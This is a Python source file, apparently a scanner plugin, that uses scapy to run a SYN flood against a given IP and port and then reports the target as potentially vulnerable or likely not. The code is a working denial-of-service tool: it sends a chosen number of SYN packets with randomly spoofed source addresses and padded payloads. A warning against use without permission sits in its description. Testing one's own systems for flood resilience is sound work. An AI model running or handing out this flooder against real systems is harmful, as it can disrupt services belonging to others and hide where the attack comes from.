from scapy.layers.inet import IP, TCP
from scapy.all import *
import random

service = ["any"]
args = ["ip", "port"]
RUN_DETAILS = {
    "title": "SYN Flood DoS Vulnerability Detection",
    "description": "Basic SYN Flood attack.\n"
                   "WARNING!!! DO NOT USE THIS ON ANY DEVICE YOU DO NOT HAVE PERMISSION TO. "
                   "IT CAN, AND WILL BE SEEN AS MALICIOUS\n"
                   "Through abuse of the TCP 3-way handshake and improperly configured firewalls,"
                   "mass amounts of dummy packets to attempt to crash or slow a host\n"
                   "This is a very basic version of DoS. For most networks and hosts, these will not be effective even "
                   "if they are not stopped",
    "services": ["tcp"],
    "args": ["ip", "port", "num_packets"],
}


def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip


def randInt():
    x = random.randint(1000, 9000)
    return x


def packet_build(ip, port):
    s_port = random.randint(1, 65535)
    s_seq = randInt()
    s_window = randInt()
    pack = IP(src=randomIP(), dst=ip) / TCP(sport=s_port, dport=port, flags="S", seq=s_seq, window=s_window) / Raw(
        b"D" * 1024)
    return pack


def flood(ip, port, num_packets):
    total_r = 0
    total_u = 0
    print("Starting DoS Attempt...")
    for total in range(0, num_packets):
        pack = packet_build(ip, port)

        res = send(pack, verbose=0, inter=0.001)

    f_res = sr(packet_build(ip, port), verbose=0, timeout=2)
    if f_res[0].res:
        total_r += 1
    elif f_res[1].res:
        total_u += 1
    return [total_r, total_u]


def run(run_args: list):
    totals = flood(run_args[0], run_args[1], int(run_args[2]))
    if totals[1] > 0:
        return (True, "Potentially Vulnerable. " + str(totals[0]) + "responses received, "
                + str(totals[1]) + " responses not received.")
    else:
        return (False, "Likely Not Vulnerable. " + str(totals[0]) + "responses received, "
                + str(totals[1]) + " responses not received.")

